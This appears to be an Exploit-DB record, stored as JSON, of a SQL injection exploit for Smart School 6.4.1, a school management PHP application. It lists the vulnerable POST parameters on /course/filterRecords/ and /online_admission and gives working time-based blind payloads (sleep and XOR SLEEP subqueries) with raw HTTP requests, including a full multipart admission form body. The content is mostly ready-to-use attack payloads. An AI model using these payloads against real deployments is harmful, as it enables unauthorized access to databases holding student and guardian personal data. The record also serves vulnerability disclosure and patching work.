{"source": "https://www.exploit-db.com/exploits/51958", "vulnName": "Smart School 6.4.1 - SQL Injection", "vulnEDBID": "51958", "vulnCVE": "N/A", "author": "CRACKER", "exploitType": "WEBAPPS", "platform": "PHP", "datePublished": "2024-04-02", "vulnContent": "# Exploit Title: Smart School 6.4.1 - SQL Injection\n# Exploit Author: CraCkEr\n# Date: 28/09/2023\n# Vendor: QDocs - qdocs.net\n# Vendor Homepage: https://smart-school.in/\n# Software Link: https://demo.smart-school.in/\n# Tested on: Windows 10 Pro\n# Impact: Database Access\n# CVE: CVE-2023-5495\n# CWE: CWE-89 - CWE-74 - CWE-707\n\n\n## Greetings\n\nThe_PitBull, Raz0r, iNs, SadsouL, His0k4, Hussin X, Mr. SQL , MoizSid09, indoushka\nCryptoJob (Twitter) twitter.com/0x0CryptoJob\n\n\n## Description\n\nSQL injection attacks can allow unauthorized access to sensitive data, modification of\ndata and crash the application or make it unavailable, leading to lost revenue and\ndamage to a company's reputation.\n\n\nPath: /course/filterRecords/\n\nPOST Parameter 'searchdata[0][title]' is vulnerable to SQLi\nPOST Parameter 'searchdata[0][searchfield]' is vulnerable to SQLi\nPOST Parameter 'searchdata[0][searchvalue]' is vulnerable to SQLi\n\nsearchdata[0][title]=[SQLi]&searchdata[0][searchfield]=[SQLi]&searchdata[0][searchvalue]=[SQLi]\n\n-------------------------------------------\nPOST /course/filterRecords/ HTTP/1.1\n\n\nsearchdata%5B0%5D%5Btitle%5D=rating&searchdata%5B0%5D%5Bsearchfield%5D=sleep(5)%23&searchdata%5B0%5D%5Bsearchvalue%5D=3\n\n-------------------------------------------\n\nsearchdata[0][title]=[SQLi]&searchdata[0][searchfield]=[SQLi]&searchdata[0][searchvalue]=[SQLi]&searchdata[1][title]=[SQLi]&searchdata[1][searchfield]=[SQLi]&searchdata[1][searchvalue]=[SQLi]\n\n\nPath: /course/filterRecords/\n\n\nPOST Parameter 'searchdata[0][title]' is vulnerable to SQLi\nPOST Parameter 'searchdata[0][searchfield]' is vulnerable to SQLi\nPOST Parameter 'searchdata[0][searchvalue]' is vulnerable to SQLi\nPOST Parameter 'searchdata[1][title]' is vulnerable to SQLi\nPOST Parameter 'searchdata[1][searchfield]' is vulnerable to SQLi\nPOST Parameter 'searchdata[1][searchvalue]' is vulnerable to SQLi\n\n---\nParameter: searchdata[0][title] (POST)\n    Type: time-based blind\n    Title: MySQL >= 5.0.12 time-based blind (query SLEEP)\n    Payload: searchdata[0][title]=Price&searchdata[0][searchfield]=1 or sleep(5)#&searchdata[0][searchvalue]=free&searchdata[1][title]=Sales&searchdata[1][searchfield]=sales&searchdata[1][searchvalue]=low\n\nParameter: searchdata[0][searchfield] (POST)\n    Type: time-based blind\n    Title: MySQL >= 5.0.12 time-based blind (query SLEEP)\n    Payload: searchdata[0][title]=Price&searchdata[0][searchfield]=1 or sleep(5)#&searchdata[0][searchvalue]=free&searchdata[1][title]=Sales&searchdata[1][searchfield]=sales&searchdata[1][searchvalue]=low\n\nParameter: searchdata[0][searchvalue] (POST)\n    Type: time-based blind\n    Title: MySQL >= 5.0.12 time-based blind (query SLEEP)\n    Payload: searchdata[0][title]=Price&searchdata[0][searchfield]=1 or sleep(5)#&searchdata[0][searchvalue]=free&searchdata[1][title]=Sales&searchdata[1][searchfield]=sales&searchdata[1][searchvalue]=low\n\nParameter: searchdata[1][title] (POST)\n    Type: time-based blind\n    Title: MySQL >= 5.0.12 time-based blind (query SLEEP)\n    Payload: searchdata[0][title]=Price&searchdata[0][searchfield]=1 or sleep(5)#&searchdata[0][searchvalue]=free&searchdata[1][title]=Sales'XOR(SELECT(0)FROM(SELECT(SLEEP(5)))a)XOR'Z&searchdata[1][searchfield]=sales&searchdata[1][searchvalue]=low\n\nParameter: searchdata[1][searchvalue] (POST)\n    Type: time-based blind\n    Title: MySQL >= 5.0.12 time-based blind (query SLEEP)\n    Payload: searchdata[0][title]=Price&searchdata[0][searchfield]=1 or sleep(5)#&searchdata[0][searchvalue]=free&searchdata[1][title]=Sales&searchdata[1][searchfield]=sales&searchdata[1][searchvalue]=low'XOR(SELECT(0)FROM(SELECT(SLEEP(7)))a)XOR'Z\n---\n\n\n-------------------------------------------\nPOST /course/filterRecords/ HTTP/1.1\n\n\nsearchdata[0][title]=[SQLi]&searchdata[0][searchfield]=[SQLi]&searchdata[0][searchvalue]=[SQLi]&searchdata[1][title]=[SQLi]&searchdata[1][searchfield]=[SQLi]&searchdata[1][searchvalue]=[SQLi]\n-------------------------------------------\n\n\n\nPath: /online_admission\n\n---\nParameter: MULTIPART email ((custom) POST)\n    Type: time-based blind\n    Title: MySQL >= 5.0.12 time-based blind (query SLEEP)\n    Payload: -----------------------------320375734131102816923531485385\\nContent-Disposition: form-data; name=\"class_id\"\\n\\n\\n-----------------------------320375734131102816923531485385\\nContent-Disposition: form-data; name=\"section_id\"\\n\\n\\n-----------------------------320375734131102816923531485385\\nContent-Disposition: form-data; name=\"firstname\"\\n\\n\\n-----------------------------320375734131102816923531485385\\nContent-Disposition: form-data; name=\"lastname\"\\n\\n\\n-----------------------------320375734131102816923531485385\\nContent-Disposition: form-data; name=\"gender\"\\n\\n\\n-----------------------------320375734131102816923531485385\\nContent-Disposition: form-data; name=\"dob\"\\n\\n\\n-----------------------------320375734131102816923531485385\\nContent-Disposition: form-data; name=\"mobileno\"\\n\\n\\n-----------------------------320375734131102816923531485385\\nContent-Disposition: form-data; name=\"email\"\\n\\n'XOR(SELECT(0)FROM(SELECT(SLEEP(5)))a)XOR'Z\\n-----------------------------320375734131102816923531485385\\nContent-Disposition: form-data; name=\"file\"; filename=\"\"\\nContent-Type: application/octet-stream\\n\\n\\n-----------------------------320375734131102816923531485385\\nContent-Disposition: form-data; name=\"father_name\"\\n\\n\\n-----------------------------320375734131102816923531485385\\nContent-Disposition: form-data; name=\"mother_name\"\\n\\n\\n-----------------------------320375734131102816923531485385\\nContent-Disposition: form-data; name=\"guardian_name\"\\n\\n\\n-----------------------------320375734131102816923531485385\\nContent-Disposition: form-data; name=\"guardian_relation\"\\n\\n\\n-----------------------------320375734131102816923531485385\\nContent-Disposition: form-data; name=\"guardian_email\"\\n\\n\\n-----------------------------320375734131102816923531485385\\nContent-Disposition: form-data; name=\"guardian_pic\"; filename=\"\"\\nContent-Type: application/octet-stream\\n\\n\\n-----------------------------320375734131102816923531485385\\nContent-Disposition: form-data; name=\"guardian_phone\"\\n\\n\\n-----------------------------320375734131102816923531485385\\nContent-Disposition: form-data; name=\"guardian_occupation\"\\n\\n\\n-----------------------------320375734131102816923531485385\\nContent-Disposition: form-data; name=\"guardian_address\"\\n\\n\\n-----------------------------320375734131102816923531485385\\nContent-Disposition: form-data; name=\"current_address\"\\n\\n\\n-----------------------------320375734131102816923531485385\\nContent-Disposition: form-data; name=\"permanent_address\"\\n\\n\\n-----------------------------320375734131102816923531485385\\nContent-Disposition: form-data; name=\"adhar_no\"\\n\\n\\n-----------------------------320375734131102816923531485385\\nContent-Disposition: form-data; name=\"samagra_id\"\\n\\n\\n-----------------------------320375734131102816923531485385\\nContent-Disposition: form-data; name=\"previous_school\"\\n\\n\\n-----------------------------320375734131102816923531485385--\n---\n\nPOST Parameter 'email' is vulnerable to SQLi\n\nPOST /online_admission HTTP/1.1\n\n-----------------------------320375734131102816923531485385\nContent-Disposition: form-data; name=\"email\"\n\n*[SQLi]\n-----------------------------320375734131102816923531485385\n\n\n[-] Done\n            "}